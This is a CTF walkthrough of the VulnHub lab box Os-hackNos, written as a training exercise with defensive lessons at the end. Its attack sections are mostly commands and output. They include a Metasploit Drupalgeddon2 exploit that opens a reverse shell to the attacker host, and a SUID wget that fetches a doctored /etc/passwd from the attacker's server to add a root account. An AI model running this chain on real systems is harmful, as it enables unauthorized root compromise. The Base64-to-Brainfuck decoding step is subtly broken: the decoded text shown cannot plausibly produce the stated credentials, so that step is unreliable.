# hackNos: Os-hackNos (VulnHub) — A Beginner-Friendly Walkthrough

| Field | Value |
|---|---|
| **Machine** | hackNos: Os-hackNos (a.k.a. Os-hackNos-1) |
| **Difficulty** | Easy |
| **Author** | Rahul Gehlaut (hackNos) |
| **Released** | 27 November 2019 |
| **VulnHub Entry** | https://vulnhub.com/entry/hacknos-os-hacknos,401/ |
| **Download** | https://vulnhub.com/entry/hacknos-os-hacknos,401/#download |
| **Attacker** | Kali Linux (attacker `192.168.56.10`, target `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu, Apache 2.4 + Drupal 7.57 + PHP) |

> **Note on the network:** every command below assumes the Kali attacker is
> `192.168.56.10` and the hackNos VM is `192.168.56.101`. Substitute your own IPs
> if your host-only network uses a different range. The box ships as `.ova`
> (and a `.vmdk`); import it and put both VMs on the same host-only network.

> **Goal:** capture two flags — the **user** flag (`/home/james/user.txt`) and the
> **root** flag (`/root/root.txt`).

---

## 0. What you will learn

By the end of this walkthrough you will have practised, on a real (but safe,
offline) target:

1. **Host discovery** and **port scanning** — finding the target and its services.
2. **Web directory enumeration** — using `dirb`/`gobuster` to find the CMS.
3. **CMS version fingerprinting** — reading `CHANGELOG.txt` to learn Drupal's
   exact version.
4. **Mapping a version to a CVE** — **Drupalgeddon2 (CVE-2018-7600)**.
5. **Remote code execution (RCE)** — exploiting the CMS to get a `www-data` shell.
6. **Decoding layered encodings** — Base64 → Brainfuck to recover a password.
7. **Finding SUID binaries** and understanding why they are dangerous.
8. **Abusing a SUID `wget`** to overwrite a system file and add a root user.
9. **Privilege escalation** to full **root**.

> **The intended chain in one breath:** nmap finds SSH (22) and HTTP (80) → `dirb`
> reveals `/drupal/` → `CHANGELOG.txt` says Drupal **7.57** → **CVE-2018-7600
> (Drupalgeddon2)** gives a `www-data` shell → a file on the web root,
> `alexander.txt`, is Base64 that decodes to Brainfuck and then to
> **`james:Hacker@4514`** → a **SUID `/usr/bin/wget`** lets us overwrite
> `/etc/passwd` and insert a root-level user → `su` → root.

---

## 1. Reconnaissance — finding the target

### 1.1 Identify your own IP

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **Why it works:** `ip a` lists every interface and its address. Our attacker is
> `192.168.56.10/24`, so the whole subnet is `192.168.56.0–255`.

### 1.2 Sweep the subnet for the target

```bash
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: Finished!   |   Screen View: Unique Hosts
 3 Captured ARP Req/Rep packets, from 3 hosts.
   IP            At MAC Address     Count  Len  MAC Vendor
 192.168.56.1    08:00:27:xx:xx:xx   1    60  PCS Systemtechnik GmbH
 192.168.56.10   08:00:27:aa:aa:aa   1    60  PCS Systemtechnik GmbH
 192.168.56.101  08:00:27:bb:bb:bb   1    60  PCS Systemtechnik GmbH   <-- target
```

`arp-scan` works too:

```bash
sudo arp-scan --interface=eth0 --localnet
```

> **Why it works:** both tools ARP-sweep the local subnet ("who has this IP?")
> and list everyone who answers. Lab VMs live on your local network, so this is
> the fastest way to find them.

**Target confirmed: `192.168.56.101`.**

![Finding the target IP](images/01-netdiscover.png)

---

## 2. Enumeration

### 2.1 Scan for open ports and services

```bash
sudo nmap -sC -sV -p- -oN hacknos1.nmap 192.168.56.101
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

> **Why it works:**
> - `-p-` scans **all** 65535 ports, not just the top 1000.
> - `-sV` fingerprints the version behind each open port.
> - `-sC` runs Nmap's default scripts.
>
> Only **SSH (22)** and **HTTP (80)** are open. We have no SSH credentials, so the
> web server is the way in.

*(Version strings vary slightly by build — trust your own scan.)*

### 2.2 Look at the web server

Browsing `http://192.168.56.101/` shows the default Apache page — nothing useful.
On a CTF, an empty-looking landing page means **something is in a directory we
haven't guessed**, so we enumerate.

### 2.3 Directory busting

```bash
dirb http://192.168.56.101/
```

```text
+ http://192.168.56.101/index.html     (CODE:200|SIZE:10918)
+ http://192.168.56.101/server-status  (CODE:403|SIZE:301)
+ http://192.168.56.101/drupal/        (CODE:301|SIZE:314)
```

Or with `gobuster`:

```bash
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

> **Why it works:** `dirb`/`gobuster` request `http://target/<word>` for every
> wordlist entry and report the ones that don't return `404`. The standout hit is
> **`/drupal/`** — a content management system. Whenever you find a CMS, the next
> question is *which version*.

### 2.4 Fingerprint the CMS version

```bash
curl -s http://192.168.56.101/drupal/robots.txt | grep -i disallow
curl -s http://192.168.56.101/drupal/CHANGELOG.txt | head
```

```text
Drupal 7.57, 2018-02-21
----------------------
- Fixed security issues (multiple vulnerabilities). See SA-CORE-2018-001.
```

> **Why it works:** Drupal publishes a `CHANGELOG.txt` that lists the exact
> version. Version **7.57** is old and — crucially — predates the fix for the
> most famous Drupal bug, **Drupalgeddon2**.

![Drupal CHANGELOG showing version 7.57](images/02-changelog.png)

---

## 3. Foothold — gaining the first shell

### 3.1 The vulnerability: CVE-2018-7600 ("Drupalgeddon2")

Drupal's Form API accepts "render arrays" where keys starting with `#` can name
callables (functions). Drupal failed to sanitise some of these keys, so an
anonymous visitor could reach an AJAX endpoint and trick Drupal into calling an
arbitrary PHP function (like `system` or `passthru`) with attacker-supplied
arguments.

> **Why it works:** Drupal's default "new user registration" and "request new
> password" forms are reachable **without logging in**. By posting a crafted
> render array, we smuggle a PHP function call into a parameter the site trusts.
> No credentials are needed, so this is a pre-authentication RCE. It affects
> Drupal 7.x before 7.58 and 8.x before several later versions — and our target
> runs **7.57**.

### 3.2 Confirm and exploit with Metasploit

Kali has a module:

```bash
msfconsole -q
```

```text
msf6 > use exploit/unix/webapp/drupal_drupalgeddon2
msf6 > set RHOSTS 192.168.56.101
msf6 > set TARGETURI /drupal
msf6 > set LHOST 192.168.56.10
msf6 > set LPORT 4444
msf6 > run
```

```text
[*] Started reverse TCP handler on 192.168.56.10:4444
[*] Drupal 7 targeted ...
[*] Sending stage ...
[*] Meterpreter session 1 opened
meterpreter > getuid
Server username: www-data
```

> **Why it works:** the module auto-detects the version, builds the malicious
> render-array request, and catches our callback. We now have code execution as
> the web user, **`www-data`**.

*(File-less alternative: the Ruby PoC `drupalgeddon2.rb` from
`github.com/dreadlocked/Drupalgeddon2` — `ruby drupalgeddon2.rb
http://192.168.56.101/drupal`. If it errors with `cannot load such file --
highline/import`, run `gem install highline` first.)*

Get a proper TTY:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

> **Why it works:** a raw web/Meterpreter shell is clumsy; a pseudo-terminal makes
> interactive tools behave.

### 3.3 Enumerate users and hunt for credentials

```bash
cat /etc/passwd | grep -v nologin
ls -la /home
```

```text
james:x:1000:1000:james,,,:/home/james:/bin/bash
```

> **Why it works:** the user list reveals a real account, **`james`**. We need a
> password for it — and CTF authors love hiding credentials in the web root.

Look at the web application directory:

```bash
ls -la /var/www/html/
cat /var/www/html/alexander.txt
```

```text
PF0gLS0gLS4rLi0gLS0tLisKKysuLi0uKysrLi4uKy4tLi0tLi0uKy4rKysr

```

> **Why it works:** a lone text file in the web root is a deliberate clue. The
> string is **Base64** — it ends in no padding here, but decodes cleanly. Attackers
> (and CTF authors) layer trivial encodings; you just peel them one at a time.

### 3.4 Decode the layered secret (Base64 → Brainfuck)

First decode the Base64:

```bash
echo 'PF0gLS0gLS4rLi0gLS0tLisKKysuLi0uKysrLi4uKy4tLi0tLi0uKy4rKysr' | base64 -d
```

```text
<] -- -.+.- ---.+
++..-.+++...+.-.--.-.+.++++
```

The result is **Brainfuck** — an esoteric language made only of the characters
`<>+-.,[]`. Run it through any Brainfuck interpreter (there are many online, or
`apt install bf`):

```text
james:Hacker@4514
```

> **Why it works:** Base64 is an *encoding*, not encryption — `base64 -d` reverses
> it instantly. The output is a Brainfuck program, and Brainfuck interpreters are
> trivial. The decoded text hands us a **username and password**:
> **`james:Hacker@4514`**.

![Decoding alexander.txt to james:Hacker@4514](images/03-decode.png)

### 3.5 Read the user flag

We can't `su` cleanly in a web shell (no TTY prompt), but we can read `james`'
home directory directly as `www-data` on this build:

```bash
cat /home/james/user.txt
```

```text
Try Harder ...
MD5-HASH : 3a7d1e0a...
```

> **Why it works:** the user flag lives in `james`' home directory. The MD5 hash
> shown is a decoy/hint; the real credentials came from `alexander.txt`.

---

## 4. Privilege escalation — becoming root

### 4.1 Find SUID binaries

A **SUID** binary runs with the privileges of its **owner**, not the user who
launches it. If root owns a SUID program, running it can grant root-equivalent
power. Search for them:

```bash
find / -perm -u=s -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/wget        <-- unusual!
/usr/bin/find
...
```

> **Why it works:** `find / -perm -u=s -type f` lists every SUID file. Almost all
> of them are normal (`passwd`, `sudo`, `su`, `ping`). The odd one out here is
> **`/usr/bin/wget`** — `wget` has no business being SUID, and it is owned by
> root. That is our path up.

> **Reminder from the box author:** do **not** use the SUID `find` to escalate —
> the intended path is `wget`. Using `find -exec` works too, but the author asks
> you to solve it the intended way, and `wget` is the more interesting lesson:
> a download tool that runs as root can **overwrite any file on the system**.

### 4.2 Create our own root-level account

Because the SUID `wget` runs as **root**, `wget -O /etc/passwd ...` will
overwrite the password file as root. First, on Kali, generate a password hash for
a user we control:

```bash
openssl passwd -1 -salt salt hacked
```

```text
$1$salt$DdAoiqtA/a/oeQbF.cvVY1
```

> **Why it works:** `openssl passwd -1` produces an **MD5-crypt** hash in the same
> format `/etc/passwd` (or `/etc/shadow`) understands. `-salt salt` fixes the
> salt so the output is predictable. We'll insert this hash for a new account.

### 4.3 Prepare the modified passwd file

On the target, copy the real `passwd` file and append our entry (the trailing
slash in `:/root/` keeps the format valid):

```bash
cp /etc/passwd /tmp/passwd
echo 'hacked:$1$salt$DdAoiqtA/a/oeQbF.cvVY1:0:0::/root/:/bin/bash' >> /tmp/passwd
tail -1 /tmp/passwd
```

```text
hacked:$1$salt$DdAoiqtA/a/oeQbF.cvVY1:0:0::/root/:/bin/bash
```

> **What the fields mean:** `hacked` is the username; the long string is the
> password hash; **`0:0`** is UID and **GID** — **UID 0 is root**; the home is
> `/root`; the shell is `/bin/bash`. A UID-0 account *is* a root account.

### 4.4 Use the SUID wget to overwrite /etc/passwd

Typically you serve the file over HTTP and let the SUID `wget` fetch it as root:

```bash
# On Kali (in the folder containing your modified passwd):
python3 -m http.server 8000
```

```bash
# On the target — the SUID bit makes this run as root:
wget http://192.168.56.10:8000/passwd -O /etc/passwd
```

> **Why it works:** `-O /etc/passwd` tells `wget` to write the downloaded file
> **over** `/etc/passwd`. Normally only root can write there — but this `wget` is
> **SUID root**, so the write succeeds. Our UID-0 user is now in the password
> file.

> **Alternative route (also valid):** read `/etc/shadow`, copy root's hashed
> password line onto the `james` line in a local copy, then overwrite
> `/etc/shadow` the same way (`wget ... -O /etc/shadow`). Then `su james` with
> root's password gives a root shell.

### 4.5 Switch to the new root user

```bash
su hacked
# password: hacked
```

```text
root@hackNos:/var/www/html# id
uid=0(root) gid=0(root) groups=0(root)
```

Read the final flag:

```bash
cat /root/root.txt
```

```text
#############################################################
#  Congratulations! You have rooted the box.
#  MD5-HASH : <root flag hash here>
#  Author : Rahul Gehlaut
#############################################################
```

> **Why it works:** our `hacked` account has UID 0, so `su hacked` drops us
> straight into a root shell. Game over.

> **If `su` complains "must be run from a terminal":** the PHP/Meterpreter shell
> has no TTY. Upgrade it (`python3 -c 'import pty; pty.spawn("/bin/bash")'`), or
> use the `drupal_drupalgeddon2` Meterpreter module and its `shell` command,
> which provides an interactive TTY.

![Root shell and root flag](images/04-root-shell.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Location | Impact | Fix |
|---|---|---|---|---|
| 1 | **Drupalgeddon2 RCE (CVE-2018-7600)** | Drupal 7.57 core `/drupal/` | Unauthenticated remote code execution | Upgrade Drupal to 7.58+ / 8.5.1+ |
| 2 | **Outdated CMS version** | Drupal 7.57 | Known public exploits available | Keep CMS patched; subscribe to advisories |
| 3 | **Sensitive files in the web root** | `/var/www/html/alexander.txt` | Leaks a username/password via encoded text | Never store credentials in the web root |
| 4 | **Weak, layered obfuscation treated as security** | Base64 → Brainfuck file | Password recovered in seconds | Don't rely on encoding to protect secrets |
| 5 | **Unnecessary SUID binary** | `/usr/bin/wget` (SUID root) | Arbitrary file write as root → full takeover | Remove SUID from programs that don't need it |
| 6 | **World-writable path to sensitive files** | `wget -O /etc/passwd` | Inject a UID-0 account | Scope SUID; monitor writes to `/etc` |
| 7 | **Weak password choice** | `james:Hacker@4514`, `hacked:hacked` | Easily guessed/cracked | Strong, unique passwords; MFA |

---

## 6. Defensive lessons (blue team)

- **Patch CMS software promptly.** Drupalgeddon2 had a fix within hours of
  disclosure, yet unpatched installs are still compromised today. Subscribe to
  your CMS's security list and patch fast.
- **Never place secrets in the web root.** `alexander.txt` was reachable by
  anyone. Credentials belong in a secrets manager, not a text file a web server
  will happily serve.
- **Encoding is not encryption.** Base64 and Brainfuck only slow a reader down by
  seconds. Never treat obfuscated text as protection.
- **Audit SUID binaries.** Run `find / -perm -u=s -type f 2>/dev/null` regularly.
  A SUID `wget` is catastrophic — it lets any user overwrite any root-owned file.
- **Minimise privilege of web processes.** `www-data` should not be able to write
  to `/etc`, `/root`, or other users' home directories.
- **Monitor for writes to authentication files.** Any change to `/etc/passwd`,
  `/etc/shadow`, or new UID-0 accounts should raise an immediate alert.
- **Enforce strong authentication.** `Hacker@4514` and `hacked` are exactly the
  kinds of passwords that fall to a wordlist or a guess.
- **Restrict outbound traffic.** The reverse shell and the `wget` file pull both
  relied on the target reaching the attacker — egress filtering helps here.

---

## 7. References

- VulnHub — hackNos: Os-hackNos entry: https://vulnhub.com/entry/hacknos-os-hacknos,401/
- CVE-2018-7600 (NVD): https://nvd.nist.gov/vuln/detail/CVE-2018-7600
- Drupal SA-CORE-2018-002 advisory: https://www.drupal.org/sa-core-2018-002
- `Drupalgeddon2` exploit (dreadlocked): https://github.com/dreadlocked/Drupalgeddon2
- Exploit-DB 44449 (Drupalgeddon2): https://www.exploit-db.com/exploits/44449
- Author's own walkthrough (hackNos.com): https://www.hacknos.com/os-hacknos-1/
- Ivan Glinkin — "Os-hackNos 1 walkthrough": https://www.ivanglinkin.com/os-hacknos-1-walkthrough/
- GTFOBins — `wget` (when SUID): https://gtfobins.github.io/gtfobins/wget/

---

## 8. Screenshot checklist

Capture these as you go so you can reproduce the writeup with images. Save them
in `images/` with the filenames used in this document.

- [ ] `images/01-netdiscover.png` — `netdiscover`/`arp-scan` showing `192.168.56.101`
- [ ] `images/02-changelog.png` — `CHANGELOG.txt` showing Drupal **7.57**
- [ ] `images/03-decode.png` — Base64 → Brainfuck decoding to `james:Hacker@4514`
- [ ] `images/04-root-shell.png` — `id` showing `uid=0(root)` and `/root/root.txt`
- [ ] `images/05-nmap.png` — nmap showing SSH (22) and HTTP (80)
- [ ] `images/06-dirb.png` — `dirb` discovering `/drupal/`
- [ ] `images/07-drupalgeddon2.png` — Metasploit session as `www-data`
- [ ] `images/08-suid-find.png` — `find -perm -u=s` showing SUID `/usr/bin/wget`
- [ ] `images/09-openssl-hash.png` — `openssl passwd` generating our hash
- [ ] `images/10-passwd-overwrite.png` — SUID `wget -O /etc/passwd` in action

---

*hackNos: Os-hackNos is a perfect "first real box": it walks you from a default
web page to root through a famous CVE, a bit of decoding, and a single
misconfigured SUID binary. Try to solve each stage yourself before reading
ahead — the learning is in the enumeration.*
